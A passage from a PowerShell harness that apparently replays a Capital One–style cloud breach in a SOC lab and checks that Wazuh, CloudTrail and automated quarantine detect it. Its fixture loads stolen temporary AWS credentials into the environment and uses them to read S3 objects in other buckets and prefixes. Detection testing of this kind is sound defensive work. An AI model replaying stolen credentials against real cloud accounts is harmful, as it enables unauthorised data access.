    Register-GtLiveObservedIds -Channel $(if($RuleId -ceq '100103'){'rule100103'}else{'rule100104'}) -Ids @($last | ForEach-Object { [string](Get-GtLiveProperty $_ @('_id','id')) })
    return @($last)
}

function Wait-GtLiveCloudTrail {
    param([Parameter(Mandatory)][DateTimeOffset]$WindowStart,[Parameter(Mandatory)][DateTimeOffset]$WindowEnd,[int]$ExpectedCount=-1,[switch]$RequireFullWindow)
    [void](Assert-GtLiveObservationBudget)
    $deadline=Get-GtLivePollDeadline -WindowEnd $WindowEnd
    $previousKey=$null;$stable=0;$last=@()
    do {
        [void](Assert-GtLiveObservationBudget)
        $rows=@(Get-GtLiveCloudTrail -WindowStart $WindowStart -WindowEnd $WindowEnd)
        $key=((@($rows|ForEach-Object {[string]$_.id}|Sort-Object -Unique)-join ','))
        if($null -ne $previousKey -and $key -ceq $previousKey){$stable++}else{$previousKey=$key;$stable=0}
        $last=$rows
        $countReady=if($ExpectedCount -ge 0){$rows.Count -ge $ExpectedCount}else{$rows.Count -gt 0}
        $windowReady=(-not $RequireFullWindow) -or [DateTimeOffset]::UtcNow -ge $WindowEnd
        if($countReady -and $windowReady -and $stable -ge $script:AdapterStablePolls){
            Register-GtLiveObservedIds -Channel 'cloudtrail' -Ids @($rows | ForEach-Object { [string]$_.id })
            return $rows
        }
        Start-Sleep -Seconds 2
    } while([DateTimeOffset]::UtcNow -lt $deadline)
    [void](Assert-GtLiveObservationBudget)
    if($RequireFullWindow -and [DateTimeOffset]::UtcNow -lt $WindowEnd){throw (New-GtLiveFailure -Category 'observation_window_incomplete')}
    Register-GtLiveObservedIds -Channel 'cloudtrail' -Ids @($last | ForEach-Object {[string]$_.id})
    return @($last)
}

function Invoke-GtLiveAwsFixture {
    param([Parameter(Mandatory)][string]$CaseId,[Parameter(Mandatory)][DateTimeOffset]$Start)
    $destination=Join-Path ([IO.Path]::GetTempPath()) ('gt-' + [guid]::NewGuid().ToString('N') + '.bin')
    $awsEnvironmentSnapshot=Get-GtLiveAwsEnvironmentSnapshot
    $temporaryCredentials=$null
    $operationPrincipalArn=''
    try {
        $profileArgs=@('--profile',$AwsProfile)
        $region=$script:AdapterExpectedRegion
        $bucket=[string]$script:AdapterState.ExpectedBucket
        $key=$script:AdapterExpectedObjectKey
        $expectedSha=[string]$script:AdapterState.PrimaryObjectSha256
        $expectSuccess=$true
        $extraArgs=@()
        switch($CaseId) {
            'normal_operator' { }
            'other_bucket' {
                $temporaryCredentials=$script:AdapterState.StolenCredentials
                if($null -eq $temporaryCredentials -or [DateTimeOffset]$temporaryCredentials.Expiration -le [DateTimeOffset]::UtcNow.AddMinutes(2)){
                    throw (New-GtLiveFailure -Category 'missing_provider:negative_other_bucket')
                }
                $env:AWS_ACCESS_KEY_ID=[string]$temporaryCredentials.AccessKeyId
                $env:AWS_SECRET_ACCESS_KEY=[string]$temporaryCredentials.SecretAccessKey
                $env:AWS_SESSION_TOKEN=[string]$temporaryCredentials.SessionToken
                $env:AWS_EC2_METADATA_DISABLED='true'
                $profileArgs=@()
                $region=[string]$script:AdapterState.OtherBucketRegion
                $bucket=[string]$script:AdapterState.OtherBucket
                $key=[string]$script:AdapterState.OtherBucketObjectKey
                $expectedSha=[string]$script:AdapterState.OtherBucketObjectSha256
            }
            'other_prefix' {
                $temporaryCredentials=$script:AdapterState.StolenCredentials
                if($null -eq $temporaryCredentials -or [DateTimeOffset]$temporaryCredentials.Expiration -le [DateTimeOffset]::UtcNow.AddMinutes(2)){
                    throw (New-GtLiveFailure -Category 'missing_provider:negative_other_prefix')
                }
                $env:AWS_ACCESS_KEY_ID=[string]$temporaryCredentials.AccessKeyId
                $env:AWS_SECRET_ACCESS_KEY=[string]$temporaryCredentials.SecretAccessKey
                $env:AWS_SESSION_TOKEN=[string]$temporaryCredentials.SessionToken
                $env:AWS_EC2_METADATA_DISABLED='true'
                $profileArgs=@()
                $key=[string]$script:AdapterState.OtherPrefixObjectKey
                $expectedSha=[string]$script:AdapterState.OtherPrefixObjectSha256
            }
            'failure' {
                $temporaryCredentials=$script:AdapterState.StolenCredentials
                if($null -eq $temporaryCredentials -or [DateTimeOffset]$temporaryCredentials.Expiration -le [DateTimeOffset]::UtcNow.AddMinutes(2)){
                    throw (New-GtLiveFailure -Category 'missing_provider:negative_failure')
                }
                $env:AWS_ACCESS_KEY_ID=[string]$temporaryCredentials.AccessKeyId
                $env:AWS_SECRET_ACCESS_KEY=[string]$temporaryCredentials.SecretAccessKey
                $env:AWS_SESSION_TOKEN=[string]$temporaryCredentials.SessionToken
                $env:AWS_EC2_METADATA_DISABLED='true'
                $profileArgs=@()
                $extraArgs=@('--if-match',[string]$script:AdapterState.FailureIfMatch)
                $expectSuccess=$false
            }
            'other_principal' {
                $roleArn=[string]$script:AdapterState.OtherPrincipalArn
                if($roleArn -notmatch ('^arn:aws:iam::'+[regex]::Escape($script:AdapterExpectedAccountId)+':role/')){throw (New-GtLiveFailure -Category 'missing_provider:negative_other_principal')}
                $roleName=($roleArn -split '/')[-1]
                $sessionName='gt03-other-principal-'+[guid]::NewGuid().ToString('N').Substring(0,8)
                $assumed=Invoke-GtLiveNative -FilePath 'aws' -ArgumentList @('sts','assume-role','--profile',$AwsProfile,'--region',$script:AdapterExpectedRegion,'--role-arn',$roleArn,'--role-session-name',$sessionName,'--duration-seconds','900','--output','json','--no-cli-pager') -FailureCategory 'negative_other_principal' | ConvertFrom-Json
                $operationPrincipalArn=[string]$assumed.AssumedRoleUser.Arn
                $expectedAssumedArn="arn:aws:sts::$($script:AdapterExpectedAccountId):assumed-role/$roleName/$sessionName"
                if($operationPrincipalArn -cne $expectedAssumedArn){
                    throw (New-GtLiveFailure -Category 'negative_other_principal_identity')
                }
                $temporaryCredentials=$assumed.Credentials
                if([string]$temporaryCredentials.AccessKeyId -notmatch '^(AKIA|ASIA)[A-Z0-9]{16}$' -or
                    [string]::IsNullOrWhiteSpace([string]$temporaryCredentials.SecretAccessKey) -or
                    [string]::IsNullOrWhiteSpace([string]$temporaryCredentials.SessionToken) -or
                    [DateTimeOffset]$temporaryCredentials.Expiration -le [DateTimeOffset]::UtcNow.AddMinutes(2)){
                    throw (New-GtLiveFailure -Category 'negative_other_principal')
                }
                $env:AWS_ACCESS_KEY_ID=[string]$temporaryCredentials.AccessKeyId
                $env:AWS_SECRET_ACCESS_KEY=[string]$temporaryCredentials.SecretAccessKey
                $env:AWS_SESSION_TOKEN=[string]$temporaryCredentials.SessionToken
                $env:AWS_EC2_METADATA_DISABLED='true'
                $profileArgs=@()
            }
            default { throw (New-GtLiveFailure -Category "missing_provider:negative_$CaseId") }
        }
        if($CaseId -in @('other_bucket','other_prefix','failure')){
            $operationPrincipalArn=[string]$script:AdapterState.StolenPrincipalArn
            if($operationPrincipalArn -notmatch ('^arn:aws:sts::'+[regex]::Escape($script:AdapterExpectedAccountId)+':assumed-role/'+[regex]::Escape($script:AdapterExpectedRoleName)+'/[^/]+$')){
                throw (New-GtLiveFailure -Category "negative_${CaseId}_principal")
            }
        }
        $operationSucceeded=$false
        try {
            [void](Invoke-GtLiveNative -FilePath 'aws' -ArgumentList (@('s3api','get-object')+$profileArgs+@('--region',$region,'--bucket',$bucket,'--key',$key)+$extraArgs+@($destination,'--output','json','--no-cli-pager')) -FailureCategory "negative_$CaseId")
            $operationSucceeded=$true
        } catch {
            if($expectSuccess){throw}
        }
        if(-not $expectSuccess){
            if($operationSucceeded){throw (New-GtLiveFailure -Category "negative_${CaseId}_unexpected_success")}
        } else {
            if(-not(Test-Path -LiteralPath $destination -PathType Leaf) -or (Get-Item -LiteralPath $destination).Length -le 0){throw (New-GtLiveFailure -Category "negative_${CaseId}_object")}
            $actualSha=(Get-FileHash -LiteralPath $destination -Algorithm SHA256).Hash.ToLowerInvariant()
            if($expectedSha -notmatch '^[a-f0-9]{64}$' -or $actualSha -cne $expectedSha){throw (New-GtLiveFailure -Category "negative_${CaseId}_object")}
        }
    } catch {
        throw
    } finally {
        Restore-GtLiveAwsEnvironment -Snapshot $awsEnvironmentSnapshot
        $temporaryCredentials=$null
        Remove-Item -LiteralPath $destination -Force -ErrorAction SilentlyContinue
    }
    return [pscustomobject]@{ supported=$true; started_at_utc=$Start.ToString('o'); finished_at_utc=([DateTimeOffset]::UtcNow).ToString('o'); principal_arn=$operationPrincipalArn }
}

function Get-GtLiveShuffleWorkflowItems {
    param([AllowNull()][object]$Response)
    if ($null -eq $Response) { return @() }
    $properties = @($Response.PSObject.Properties | ForEach-Object { [string]$_.Name })
    if ($properties -contains 'workflows') { return @($Response.workflows) }
    if ($properties -contains 'items') { return @($Response.items) }
    if ($properties -contains 'data') {
        $data = $Response.data
        $dataProperties = @($data.PSObject.Properties | ForEach-Object { [string]$_.Name })
        if ($dataProperties -contains 'workflows') { return @($data.workflows) }
        if ($dataProperties -contains 'items') { return @($data.items) }
        if ($data -is [array] -or $data -is [Collections.IList]) { return @($data) }
        throw (New-GtLiveFailure -Category 'missing_provider:shuffle_workflow_state')
    }
    if ($Response -is [array] -or $Response -is [Collections.IList]) { return @($Response) }
    throw (New-GtLiveFailure -Category 'missing_provider:shuffle_workflow_state')
}

function ConvertTo-GtLiveKubernetesDeclarativeProjection {
    param([Parameter(Mandatory)][object]$Deployment,[Parameter(Mandatory)][object]$Policies)
    $deploymentMetadata=Get-GtLiveProperty $Deployment @('metadata')
    $deploymentSpec=Get-GtLiveProperty $Deployment @('spec')
    $template=Get-GtLiveProperty $deploymentSpec @('template')
    $templateMetadata=Get-GtLiveProperty $template @('metadata')
    $templateSpec=Get-GtLiveProperty $template @('spec')
    $containers=@(Get-GtLiveProperty $templateSpec @('containers') | ForEach-Object {
        $ports=@(Get-GtLiveProperty $_ @('ports') | ForEach-Object {
            [ordered]@{name=[string](Get-GtLiveProperty $_ @('name'));containerPort=[int](Get-GtLiveProperty $_ @('containerPort'));protocol=[string](Get-GtLiveProperty $_ @('protocol'))}
        })
        [ordered]@{name=[string](Get-GtLiveProperty $_ @('name'));image=[string](Get-GtLiveProperty $_ @('image'));ports=$ports}
    })
    $deploymentProjection=[ordered]@{
        apiVersion=[string](Get-GtLiveProperty $Deployment @('apiVersion'))
        kind=[string](Get-GtLiveProperty $Deployment @('kind'))
        metadata=[ordered]@{name=[string](Get-GtLiveProperty $deploymentMetadata @('name'));namespace=[string](Get-GtLiveProperty $deploymentMetadata @('namespace'))}
        spec=[ordered]@{
            replicas=[int](Get-GtLiveProperty $deploymentSpec @('replicas'))
            selector=Get-GtLiveProperty $deploymentSpec @('selector')
            template=[ordered]@{metadata=[ordered]@{labels=Get-GtLiveProperty $templateMetadata @('labels')};spec=[ordered]@{containers=$containers}}
        }
    }
    $policyProjection=@(Get-GtLiveProperty $Policies @('items') | ForEach-Object {
        $metadata=Get-GtLiveProperty $_ @('metadata')
        [ordered]@{
            apiVersion=[string](Get-GtLiveProperty $_ @('apiVersion'))
            kind=[string](Get-GtLiveProperty $_ @('kind'))
            metadata=[ordered]@{name=[string](Get-GtLiveProperty $metadata @('name'));namespace=[string](Get-GtLiveProperty $metadata @('namespace'))}
            spec=Get-GtLiveProperty $_ @('spec')
        }
    })
    $policyProjection=@($policyProjection | Sort-Object { ConvertTo-GtLiveCanonicalJson $_ })
    return [ordered]@{deployment=$deploymentProjection;network_policies=$policyProjection}
}

function ConvertTo-GtLiveIamDeclarativeProjection {
    param([Parameter(Mandatory)][object]$PolicyDocument)
    $statements=@(Get-GtLiveProperty $PolicyDocument @('Statement') | ForEach-Object {
        [ordered]@{
            Sid=Get-GtLiveProperty $_ @('Sid')
            Effect=Get-GtLiveProperty $_ @('Effect')
            Action=Get-GtLiveProperty $_ @('Action')
            Resource=Get-GtLiveProperty $_ @('Resource')
            Condition=Get-GtLiveProperty $_ @('Condition')
            Principal=Get-GtLiveProperty $_ @('Principal')
        }
    })
    $statements=@($statements | Sort-Object { ConvertTo-GtLiveCanonicalJson $_ })
    return [ordered]@{Version=Get-GtLiveProperty $PolicyDocument @('Version');Statement=$statements}
}

function Get-GtLiveSideEffectSnapshot {
    param([Parameter(Mandatory)][object]$Context)
    $captured=[DateTimeOffset]::UtcNow
    $windowStart=if($null -ne (Get-GtLiveProperty $Context @('window_start_utc'))){Convert-GtLiveUtc (Get-GtLiveProperty $Context @('window_start_utc'))}else{$captured.AddSeconds(-1)}
    $windowEnd=if($null -ne (Get-GtLiveProperty $Context @('window_end_utc'))){Convert-GtLiveUtc (Get-GtLiveProperty $Context @('window_end_utc'))}else{$captured.AddSeconds(-1)}
    if($windowEnd -gt $captured){throw (New-GtLiveFailure -Category 'side_effect_window_future')}
    $apiKey=$null
    try {
        Import-Module (Join-Path $PSScriptRoot '..\..\automation\SocLab.Configuration.psm1') -Force
        Import-Module (Join-Path $PSScriptRoot '..\..\automation\SocLab.Shuffle.psm1') -Force
        $cfg=Read-SocLabConfiguration
        $apiKey=Unprotect-SocSecret -Name 'shuffle_api_key' -SecretRoot ([string]$script:AdapterState.SecretRoot)
        $workflowList=Invoke-ShuffleApiRequest -Method GET -RelativePath '/api/v1/workflows' -ApiKey $apiKey -OrgId ([string]$cfg.shuffle_org_id) -BaseUri ([uri]$cfg.shuffle_api_base)
        $workflowItems = @(Get-GtLiveShuffleWorkflowItems -Response $workflowList)
        $v1=@($workflowItems|Where-Object {[string](Get-GtLiveProperty $_ @('id','workflow_id')) -ceq [string]$cfg.shuffle_workflow_id -and [string]$_.name -ceq $script:AdapterV1WorkflowName})
        $v2=@($workflowItems|Where-Object {[string]$_.name -ceq $script:AdapterV2WorkflowName -and ([string]::IsNullOrWhiteSpace([string](Get-GtLiveProperty $_ @('org_id','organization_id'))) -or [string](Get-GtLiveProperty $_ @('org_id','organization_id')) -ceq [string]$cfg.shuffle_org_id)})
        if ($ShuffleV2WorkflowId) {
            if ($ShuffleV2WorkflowId -notmatch '^[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[1-5][0-9a-fA-F]{3}-[89abAB][0-9a-fA-F]{3}-[0-9a-fA-F]{12}$') { throw (New-GtLiveFailure -Category 'missing_provider:shuffle_workflow_state') }
            $v2=@($workflowItems|Where-Object {[string](Get-GtLiveProperty $_ @('id','workflow_id')) -ceq $ShuffleV2WorkflowId -and [string]$_.name -ceq $script:AdapterV2WorkflowName})
        }
        if ($v1.Count -ne 1 -or $v2.Count -ne 1) { throw (New-GtLiveFailure -Category 'missing_provider:shuffle_workflow_state') }
        $workflowIds=@([string](Get-GtLiveProperty $v1[0] @('id','workflow_id')),[string](Get-GtLiveProperty $v2[0] @('id','workflow_id')))|Sort-Object -Unique
        $shuffleIds=[Collections.Generic.List[string]]::new()
        foreach($workflowId in $workflowIds) {
            $execs=@(Get-ShuffleSocWorkflowExecutions -WorkflowId $workflowId -ApiKey $apiKey -OrgId ([string]$cfg.shuffle_org_id) -BaseUri ([uri]$cfg.shuffle_api_base) -Top 100)
            if ($execs.Count -ge 100) { throw (New-GtLiveFailure -Category 'missing_provider:shuffle_pagination') }
            foreach($execution in $execs) {
                $executionId=[string](Get-GtLiveProperty $execution @('execution_id','id'))
                if($executionId -notmatch '^[A-Za-z0-9._:/-]{1,200}$'){throw (New-GtLiveFailure -Category 'missing_provider:shuffle_execution_state')}
                [void]$shuffleIds.Add($executionId)
            }
        }
        $runsText=Invoke-GtLiveNative -FilePath 'gh' -ArgumentList @('api','repos/Unoh03/Uns-DVWA/actions/runs?branch=main&per_page=100') -FailureCategory 'missing_provider:github_state'
        $runs=@($runsText|ConvertFrom-Json -Depth 50).workflow_runs
        if ($runs.Count -ge 100) { throw (New-GtLiveFailure -Category 'missing_provider:github_pagination') }
        $githubIds=@($runs|ForEach-Object {[string](Get-GtLiveProperty $_ @('id','database_id'))}|Where-Object {$_ -match '^[0-9]+$'}|Sort-Object -Unique)
        $valuesText=Invoke-GtLiveNative -FilePath 'gh' -ArgumentList @('api','repos/Unoh03/Uns-DVWA/contents/deploy/dvwa/values.yaml?ref=main') -FailureCategory 'missing_provider:dvwa_state'
        $values=$valuesText|ConvertFrom-Json -Depth 30
        $blobSha=[string](Get-GtLiveProperty $values @('sha'))
        if($blobSha -notmatch '^[0-9a-f]{40}$'){throw (New-GtLiveFailure -Category 'runtime_shape_dvwa_state')}
        $deploymentText=Invoke-GtLiveNative -FilePath 'kubectl' -ArgumentList @('get','deployment','dvwa','-n','dvwa','-o','json') -FailureCategory 'missing_provider:quarantine_state'
        $deployment=$deploymentText|ConvertFrom-Json -Depth 100
        $policyText=Invoke-GtLiveNative -FilePath 'kubectl' -ArgumentList @('get','networkpolicy','-n','dvwa','-o','json') -FailureCategory 'missing_provider:quarantine_state'
        $policies=$policyText|ConvertFrom-Json -Depth 100
        $quarantineProjection=ConvertTo-GtLiveKubernetesDeclarativeProjection -Deployment $deployment -Policies $policies
        $quarantineCanonical=ConvertTo-GtLiveCanonicalJson $quarantineProjection
        $quarantineHash=Get-GtLiveSha256 $quarantineCanonical
        $policyText=Invoke-GtLiveNative -FilePath 'aws' -ArgumentList @('iam','get-role-policy','--profile',$AwsProfile,'--role-name',$script:AdapterExpectedRoleName,'--policy-name','capital-one-validation-read','--output','json','--no-cli-pager') -FailureCategory 'missing_provider:validation_state'
        $policy=$policyText|ConvertFrom-Json -Depth 100
        $policyDocument=$policy.PolicyDocument
        if ($policyDocument -is [string]) { $policyDocument=[uri]::UnescapeDataString([string]$policyDocument) | ConvertFrom-Json -Depth 100 }
        $validationProjection=ConvertTo-GtLiveIamDeclarativeProjection -PolicyDocument $policyDocument
        $validationCanonical=ConvertTo-GtLiveCanonicalJson $validationProjection
        $validationHash=Get-GtLiveSha256 $validationCanonical
        if($quarantineHash -notmatch '^[a-f0-9]{64}$' -or $validationHash -notmatch '^[a-f0-9]{64}$'){throw (New-GtLiveFailure -Category 'missing_provider:side_effect_state')}
        $githubIds=@($githubIds + ('github:values:'+ $blobSha) | Sort-Object -Unique)
        $quarantineId='k8s:quarantine:sha256:'+ $quarantineHash
        $validationId='aws:iam:capital-one-validation-read:sha256:'+ $validationHash
        return [pscustomobject]@{read_only=$true;captured_at_utc=$captured.ToString('o');window_start_utc=$windowStart.ToString('o');window_end_utc=$windowEnd.ToString('o');source_ids=@('shuffle-state','github-state','dvwa-quarantine-state','validation-state');shuffle_execution_ids=@($shuffleIds|Sort-Object -Unique);github_run_ids=$githubIds;quarantine_mutation_ids=@($quarantineId);validation_mutation_ids=@($validationId)}
    } catch { throw (New-GtLiveFailure -Category 'missing_provider:side_effect_state') }
    finally { $apiKey=$null }
}

function Invoke-GtLiveRun {
    if ($ConfirmRun -cne 'RUN GT02 GT03 LIVE') { throw (New-GtLiveFailure -Category 'confirmation_required') }
    $awsEnvironmentSnapshot = Get-GtLiveAwsEnvironmentSnapshot
    $script:AdapterState=[ordered]@{ RuntimeRoot=$RuntimeRoot; SecretRoot=$SecretRoot; ExpectedBucket=''; OtherBucket=''; OtherBucketRegion=''; OtherBucketObjectKey=''; OtherBucketObjectSha256=''; OtherPrefixObjectKey=''; OtherPrefixObjectSha256=''; StolenCredentials=$null; StolenPrincipalArn=''; LookbackSeconds=$CloudTrailLookbackSeconds; PollDeadlineSeconds=$DeliveryGraceSeconds; RunDeadlineUtc=([DateTimeOffset]::UtcNow.AddSeconds($RunObservationBudgetSeconds)); Session=$null; LivePath=$null; Dvwa=$null; WazuhPassword=$null; TakeIndex=0; TakeIds=@(); Correlations=@{}; ObservedIds=@{bridge=[Collections.Generic.HashSet[string]]::new([StringComparer]::Ordinal);rule100103=[Collections.Generic.HashSet[string]]::new([StringComparer]::Ordinal);rule100104=[Collections.Generic.HashSet[string]]::new([StringComparer]::Ordinal);cloudtrail=[Collections.Generic.HashSet[string]]::new([StringComparer]::Ordinal)}; CloudTrailLogGroup=''; CloudTrailName=''; DailyDeadline=$null; HeartbeatAt=$null; PrimaryObjectSha256=''; PrimaryObjectEtag=''; FailureIfMatch=''; ValidationPolicySha256=''; NormalPrincipalArn=''; OtherPrincipalArn='' }
    try {
        Import-Module (Join-Path $PSScriptRoot '..\..\automation\SocLab.Security.psm1') -Force
        Import-Module (Join-Path $PSScriptRoot '..\..\automation\SocLab.Runtime.psm1') -Force
        $secretRoot=if($SecretRoot){$SecretRoot}else{Get-SocSecretRoot}
        $script:AdapterState.SecretRoot=$secretRoot
        $script:AdapterState.WazuhPassword=Unprotect-SocSecret -Name 'wazuh_indexer_admin_password' -SecretRoot $secretRoot
        # The complete read-only boundary runs before any attack operation.
        Invoke-GtLivePreflight
        # DVWA login is the first state-changing request and is deliberately
        # after every AWS, Wazuh, Bridge, Shuffle, GitHub, Kubernetes, and
        # Terraform read-only preflight check.
        $script:AdapterState.Dvwa = New-GtLiveDvwaSession
        for($i=0;$i -lt 3;$i++){ $script:AdapterState.TakeIds += New-SocTakeId }
        $script:AdapterState.TakeIndex=0
        . (Join-Path $PSScriptRoot 'Invoke-CapitalOneGt02Gt03Runtime.ps1')
        # These IDs are external runner metadata.  The existing SocLab active
        # session/TAKE file is intentionally left untouched.
        $takeProvider={ param($c) $script:AdapterState.TakeIndex++; $id=[string]$script:AdapterState.TakeIds[$script:AdapterState.TakeIndex-1]; [pscustomobject]@{take_id=$id} }
        $baselineProvider={ param($c) $now=[DateTimeOffset]::UtcNow; Get-GtLiveBaseline -CapturedAt $now }
        $attackProvider={ param($c) Invoke-GtLiveDvwaOperation -TakeId ([string]$c.take_id) -Kind attack }
        $bridgeProvider={ param($c) $key=[string]$c.phase+':'+[string]$c.take_index; $count=Get-GtLiveProperty $c @('expected_count'); if($null -eq $count){$count=-1}; $full=[bool](Get-GtLiveProperty $c @('require_full_window')); @(Wait-GtLiveBridgeRecords -WindowStart (Convert-GtLiveUtc $c.window_start_utc) -WindowEnd (Convert-GtLiveUtc $c.window_end_utc) -ExternalTakeId ([string]$c.take_id) -CorrelationKey $key -ExpectedCount ([int]$count) -RequireFullWindow:$full) }
        $wazuhProvider={ param($c) $waitEmpty=([string]$c.phase -eq 'gt02-normal'); $key=[string]$c.phase+':'+[string]$c.take_index; $count=Get-GtLiveProperty $c @('expected_count'); if($null -eq $count){$count=-1}; $full=[bool](Get-GtLiveProperty $c @('require_full_window')); @(Wait-GtLiveWazuhAlerts -RuleId ([string]$c.rule_id) -WindowStart (Convert-GtLiveUtc $c.window_start_utc) -WindowEnd (Convert-GtLiveUtc $c.window_end_utc) -WaitForEmpty $waitEmpty -ExternalTakeId $(if([string]$c.rule_id -ceq '100103'){[string]$c.take_id}else{''}) -CorrelationKey $key -ExpectedCount ([int]$count) -RequireFullWindow:$full) }
        $cloudProvider={ param($c) $count=Get-GtLiveProperty $c @('expected_count'); if($null -eq $count){$count=-1}; $full=[bool](Get-GtLiveProperty $c @('require_full_window')); @(Wait-GtLiveCloudTrail -WindowStart (Convert-GtLiveUtc $c.window_start_utc) -WindowEnd (Convert-GtLiveUtc $c.window_end_utc) -ExpectedCount ([int]$count) -RequireFullWindow:$full) }
        $normalProvider={ param($c) $now=[DateTimeOffset]::UtcNow; $baseline=Get-GtLiveBaseline -CapturedAt $now; $op=Invoke-GtLiveDvwaOperation -TakeId ([string]$c.take_id) -Kind normal; $op|Add-Member -NotePropertyName baseline -NotePropertyValue $baseline; $op }
        $negativeProvider={ param($c) $now=[DateTimeOffset]::UtcNow; Invoke-GtLiveAwsFixture -CaseId ([string]$c.case_id) -Start $now }
        $sideProvider={ param($c) Get-GtLiveSideEffectSnapshot -Context $c }
        $summary=Invoke-CapitalOneGt02Gt03Runtime -TakeCount 3 -ExpectedTakeIds @($script:AdapterState.TakeIds) -ExpectedBucket ([string]$script:AdapterState.ExpectedBucket) -ExpectedSecondaryBucket ([string]$script:AdapterState.OtherBucket) -ExpectedSecondaryObjectKey ([string]$script:AdapterState.OtherBucketObjectKey) -ExpectedOtherPrefixObjectKey ([string]$script:AdapterState.OtherPrefixObjectKey) -ExpectedOtherPrincipalArn ([string]$script:AdapterState.OtherPrincipalArn) -DeliveryGraceSeconds $DeliveryGraceSeconds -TakeProvider $takeProvider -BaselineProvider $baselineProvider -AttackProvider $attackProvider -BridgeEventProvider $bridgeProvider -WazuhAlertProvider $wazuhProvider -CloudTrailProvider $cloudProvider -NegativeProvider $negativeProvider -NormalProvider $normalProvider -SideEffectProvider $sideProvider
        if ([string]$summary.provider_provenance -ne 'generic-injected-provider') { throw (New-GtLiveFailure -Category 'runner_contract') }
        $summary | Add-Member -NotePropertyName provider_provenance -NotePropertyValue 'live-adapter-fixed' -Force
        $summary | Add-Member -NotePropertyName execution_mode -NotePropertyValue 'live-adapter' -Force
        $summary | Add-Member -NotePropertyName gate02 -NotePropertyValue 'RUNTIME_PASS' -Force
        $summary | Add-Member -NotePropertyName gate03 -NotePropertyValue 'RUNTIME_PASS' -Force
        return $summary
    } finally {
        Restore-GtLiveAwsEnvironment -Snapshot $awsEnvironmentSnapshot
        if ($null -ne $script:AdapterState) { $script:AdapterState.WazuhPassword=$null; $script:AdapterState.Dvwa=$null; $script:AdapterState.StolenCredentials=$null; $script:AdapterState.StolenPrincipalArn='' }
    }
}

if (-not $LibraryOnly) {
    try { Invoke-GtLiveRun } catch { throw $_.Exception }
}
